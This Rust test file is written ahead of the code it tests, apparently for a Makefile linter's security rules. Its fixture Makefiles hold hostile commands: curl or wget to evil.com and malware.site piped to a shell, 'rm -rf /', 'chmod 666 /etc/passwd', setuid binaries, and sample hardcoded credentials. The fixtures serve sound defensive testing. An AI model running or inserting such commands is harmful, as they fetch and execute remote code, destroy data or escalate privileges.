//! TDD Test for Makefile Linter Security Rules (Sprint 80)
//!
//! Following Toyota Way TDD principles:
//! 1. Write test FIRST (Red)
//! 2. Make it pass (Green)
//! 3. Refactor to maintain complexity ≤10 (Refactor)
//!
//! Security Rules Implementation:
//! - ShellInjectionRule: Detect potential shell injection vulnerabilities
//! - SensitiveDataRule: Detect hardcoded secrets and credentials
//! - UnsafeCommandRule: Detect unsafe command usage
//! - PrivilegeEscalationRule: Detect potential privilege escalation

use pmat::services::makefile_linter::rules::{
    MakefileRule, RuleSeverity, Violation, ViolationFix,
};
use std::path::PathBuf;

/// Test shell injection detection in Makefile variables
#[test]
fn test_shell_injection_rule_detects_unquoted_variables() {
    // RED PHASE: This test should FAIL until ShellInjectionRule is implemented

    let rule = ShellInjectionRule::new();
    let content = r#"
target:
    rm -rf $(USER_INPUT)
    echo $(UNTRUSTED_VAR) > output.txt
    curl $(URL)/api
"#;

    let violations = rule.check("Makefile", content);

    assert_eq!(violations.len(), 3, "Should detect 3 shell injection vulnerabilities");

    // Verify first violation
    assert_eq!(violations[0].line, 3);
    assert!(violations[0].message.contains("shell injection"));
    assert_eq!(violations[0].severity, RuleSeverity::Critical);

    // Verify fix is provided
    assert!(violations[0].fix.is_some());
    let fix = violations[0].fix.as_ref().unwrap();
    assert!(fix.replacement.contains("\"$(USER_INPUT)\""));
}

/// Test shell injection with command substitution
#[test]
fn test_shell_injection_rule_detects_command_substitution() {
    let rule = ShellInjectionRule::new();
    let content = r#"
deploy:
    ssh user@$(shell cat server.txt) "rm -rf /tmp/*"
    docker run -v `pwd`:/app myimage
"#;

    let violations = rule.check("Makefile", content);

    assert!(violations.len() >= 2);
    assert!(violations.iter().any(|v| v.message.contains("command substitution")));
}

/// Test sensitive data detection
#[test]
fn test_sensitive_data_rule_detects_hardcoded_secrets() {
    // RED PHASE: This test should FAIL until SensitiveDataRule is implemented

    let rule = SensitiveDataRule::new();
    let content = r#"
AWS_ACCESS_KEY = AKIAIOSFODNN7EXAMPLE
AWS_SECRET = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
DB_PASSWORD = admin123
API_TOKEN = sk-1234567890abcdef
GITHUB_TOKEN = ghp_xxxxxxxxxxxxxxxxxxxx

deploy:
    curl -H "Authorization: Bearer hardcoded_token_12345" https://api.example.com
"#;

    let violations = rule.check("Makefile", content);

    assert!(violations.len() >= 6, "Should detect multiple hardcoded secrets");

    // Check AWS key detection
    let aws_violation = violations.iter()
        .find(|v| v.message.contains("AWS"))
        .expect("Should detect AWS credentials");
    assert_eq!(aws_violation.severity, RuleSeverity::Critical);

    // Check that fixes suggest environment variables
    assert!(aws_violation.fix.is_some());
    let fix = aws_violation.fix.as_ref().unwrap();
    assert!(fix.replacement.contains("$${AWS_ACCESS_KEY}") ||
            fix.replacement.contains("$(AWS_ACCESS_KEY_ENV)"));
}

/// Test sensitive data patterns
#[test]
fn test_sensitive_data_rule_patterns() {
    let rule = SensitiveDataRule::new();

    // Test various secret patterns
    let patterns = vec![
        ("PASSWORD=secret123", true),
        ("API_KEY=abcd-1234-efgh-5678", true),
        ("private_key = -----BEGIN RSA PRIVATE KEY-----", true),
        ("token: eyJhbGciOiJIUzI1NiIs", true),  // JWT token
        ("SECRET_HASH=sha256:abcdef123456", true),
        ("SAFE_VAR=$$PASSWORD", false),  // Environment variable reference
        ("BUILD_ID=12345", false),  // Not sensitive
    ];

    for (content, should_detect) in patterns {
        let violations = rule.check("test.mk", content);
        assert_eq!(
            !violations.is_empty(),
            should_detect,
            "Pattern '{}' detection mismatch",
            content
        );
    }
}

/// Test unsafe command detection
#[test]
fn test_unsafe_command_rule_detects_dangerous_operations() {
    // RED PHASE: This test should FAIL until UnsafeCommandRule is implemented

    let rule = UnsafeCommandRule::new();
    let content = r#"
clean:
    rm -rf /
    rm -rf /*
    find / -name "*.log" -delete
    chmod 777 /usr/bin
    curl http://evil.com/script.sh | bash
    wget -O - http://malware.site/install | sh
    eval "$(curl -s http://example.com/script)"
"#;

    let violations = rule.check("Makefile", content);

    assert!(violations.len() >= 7, "Should detect multiple unsafe commands");

    // Check rm -rf / detection
    let rm_root = violations.iter()
        .find(|v| v.line == 3 && v.message.contains("rm -rf /"))
        .expect("Should detect rm -rf /");
    assert_eq!(rm_root.severity, RuleSeverity::Critical);

    // Check curl | bash detection
    let curl_bash = violations.iter()
        .find(|v| v.message.contains("curl") && v.message.contains("pipe"))
        .expect("Should detect curl | bash pattern");
    assert_eq!(curl_bash.severity, RuleSeverity::High);
}

/// Test privilege escalation detection
#[test]
fn test_privilege_escalation_rule_detects_sudo_misuse() {
    // RED PHASE: This test should FAIL until PrivilegeEscalationRule is implemented

    let rule = PrivilegeEscalationRule::new();
    let content = r#"
install:
    sudo chmod 666 /etc/passwd
    sudo -E bash -c "$(UNTRUSTED_CMD)"
    sudo chown root:root binary && sudo chmod +s binary
    pkexec /bin/bash
    su - -c "rm -rf /var/log/*"
"#;

    let violations = rule.check("Makefile", content);

    assert!(violations.len() >= 5, "Should detect privilege escalation attempts");

    // Check sudo with untrusted variable
    let sudo_var = violations.iter()
        .find(|v| v.message.contains("sudo") && v.message.contains("untrusted"))
        .expect("Should detect sudo with untrusted input");
    assert_eq!(sudo_var.severity, RuleSeverity::Critical);

    // Check setuid detection
    let setuid = violations.iter()
        .find(|v| v.message.contains("setuid") || v.message.contains("+s"))
        .expect("Should detect setuid binary creation");
    assert_eq!(setuid.severity, RuleSeverity::High);
}

/// Test security rule integration
#[test]
fn test_security_rules_integration() {
    // Test that all security rules work together
    let rules: Vec<Box<dyn MakefileRule>> = vec![
        Box::new(ShellInjectionRule::new()),
        Box::new(SensitiveDataRule::new()),
        Box::new(UnsafeCommandRule::new()),
        Box::new(PrivilegeEscalationRule::new()),
    ];

    let content = r#"
# Dangerous Makefile with multiple security issues
API_KEY = sk-1234567890abcdef
PASSWORD = admin123

deploy:
    rm -rf $(USER_DIR)/*
    curl -H "Authorization: $(API_KEY)" http://api.example.com
    sudo docker run --privileged -v /:/host dangerous/image
    eval "$(curl -s http://evil.com/script)"
"#;

    let mut all_violations = Vec::new();
    for rule in &rules {
        all_violations.extend(rule.check("Makefile", content));
    }

    // Should detect issues from multiple rules
    assert!(all_violations.len() >= 6, "Should detect multiple security issues");

    // Verify we have violations from different rule types
    let has_injection = all_violations.iter().any(|v| v.rule_id.contains("injection"));
    let has_secrets = all_violations.iter().any(|v| v.rule_id.contains("sensitive"));
    let has_unsafe = all_violations.iter().any(|v| v.rule_id.contains("unsafe"));
    let has_privilege = all_violations.iter().any(|v| v.rule_id.contains("privilege"));

    assert!(has_injection && has_secrets && has_unsafe && has_privilege,
            "Should have violations from all security rule types");
}

/// Test fix generation for security violations
#[test]
fn test_security_rule_fixes_are_actionable() {
    let rule = ShellInjectionRule::new();
    let content = r#"
build:
    gcc $(CFLAGS) -o app main.c
"#;

    let violations = rule.check("Makefile", content);
    assert!(!violations.is_empty());

    let violation = &violations[0];
    assert!(violation.fix.is_some());

    let fix = violation.fix.as_ref().unwrap();
    assert!(!fix.replacement.is_empty());
    assert!(fix.replacement.contains("\"$(CFLAGS)\"") ||
            fix.replacement.contains("$${CFLAGS}"));

    // Fix should be safe to apply
    assert!(fix.is_safe);
}

/// Test security rules with real-world Makefile patterns
#[test]
fn test_security_rules_real_world_patterns() {
    let rule = ShellInjectionRule::new();

    // Common patterns that should be flagged
    let unsafe_patterns = vec![
        "rm -rf $(PREFIX)/bin",
        "install -m 755 app $(DESTDIR)/usr/bin",
        "tar xzf $(ARCHIVE) -C $(OUTPUT_DIR)",
        "find $(SRC_DIR) -name '*.o' -delete",
    ];

    for pattern in unsafe_patterns {
        let content = format!("target:\n    {}", pattern);
        let violations = rule.check("test.mk", &content);
        assert!(!violations.is_empty(),
                "Should detect unsafe pattern: {}", pattern);
    }

    // Safe patterns that should NOT be flagged
    let safe_patterns = vec![
        "rm -rf \"$(PREFIX)/bin\"",
        "rm -rf $${TEMP_DIR}",
        "install -m 755 app \"$(DESTDIR)/usr/bin\"",
        "@echo 'Building $(TARGET)'",  // Echo is generally safe
    ];

    for pattern in safe_patterns {
        let content = format!("target:\n    {}", pattern);
        let violations = rule.check("test.mk", &content);
        assert!(violations.is_empty(),
                "Should NOT flag safe pattern: {}", pattern);
    }
}

/// Test severity levels are appropriate
#[test]
fn test_security_rule_severity_levels() {
    // Critical: Direct security vulnerabilities
    let critical_cases = vec![
        ("rm -rf /", UnsafeCommandRule::new()),
        ("AWS_SECRET_KEY=wJalrXUtn", SensitiveDataRule::new()),
        ("sudo bash -c \"$(CMD)\"", PrivilegeEscalationRule::new()),
    ];

    for (content, rule) in critical_cases {
        let violations = rule.check("test.mk", content);
        assert!(!violations.is_empty());
        assert_eq!(violations[0].severity, RuleSeverity::Critical,
                   "Content '{}' should be Critical severity", content);
    }

    // High: Potential security issues
    let high_cases = vec![
        ("curl http://example.com | sh", UnsafeCommandRule::new()),
        ("chmod 777 important_file", UnsafeCommandRule::new()),
    ];

    for (content, rule) in high_cases {
        let violations = rule.check("test.mk", content);
        assert!(!violations.is_empty());
        assert_eq!(violations[0].severity, RuleSeverity::High,
                   "Content '{}' should be High severity", content);
    }
}

// Placeholder structs for compilation (will be replaced by actual implementations)
struct ShellInjectionRule;
struct SensitiveDataRule;
struct UnsafeCommandRule;
struct PrivilegeEscalationRule;

impl ShellInjectionRule {
    fn new() -> Self { Self }
}

impl SensitiveDataRule {
    fn new() -> Self { Self }
}

impl UnsafeCommandRule {
    fn new() -> Self { Self }
}

impl PrivilegeEscalationRule {
    fn new() -> Self { Self }
}

impl MakefileRule for ShellInjectionRule {
    fn check(&self, _file: &str, _content: &str) -> Vec<Violation> {
        todo!("Implement ShellInjectionRule")
    }

    fn rule_id(&self) -> &'static str {
        "security/shell-injection"
    }

    fn description(&self) -> &'static str {
        "Detects potential shell injection vulnerabilities"
    }
}

impl MakefileRule for SensitiveDataRule {
    fn check(&self, _file: &str, _content: &str) -> Vec<Violation> {
        todo!("Implement SensitiveDataRule")
    }

    fn rule_id(&self) -> &'static str {
        "security/sensitive-data"
    }

    fn description(&self) -> &'static str {
        "Detects hardcoded secrets and credentials"
    }
}

impl MakefileRule for UnsafeCommandRule {
    fn check(&self, _file: &str, _content: &str) -> Vec<Violation> {
        todo!("Implement UnsafeCommandRule")
    }

    fn rule_id(&self) -> &'static str {
        "security/unsafe-command"
    }

    fn description(&self) -> &'static str {
        "Detects unsafe command usage"
    }
}

impl MakefileRule for PrivilegeEscalationRule {
    fn check(&self, _file: &str, _content: &str) -> Vec<Violation> {
        todo!("Implement PrivilegeEscalationRule")
    }

    fn rule_id(&self) -> &'static str {
        "security/privilege-escalation"
    }

    fn description(&self) -> &'static str {
        "Detects potential privilege escalation"
    }
}